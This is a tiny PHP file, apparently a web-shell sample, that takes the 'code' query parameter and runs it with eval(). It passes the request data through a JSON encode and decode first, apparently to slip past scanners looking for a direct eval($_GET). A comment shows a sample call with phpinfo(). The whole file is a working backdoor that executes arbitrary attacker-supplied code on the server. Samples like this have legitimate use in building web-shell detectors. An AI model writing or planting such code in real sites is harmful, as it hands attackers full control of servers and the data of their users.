<?php
// json.php?code=phpinfo();
class Emp {
    public $a = "";
}
$e = new Emp();
$e->a = $_GET;
eval(json_decode(json_encode($e), true)['a']['code']);
?>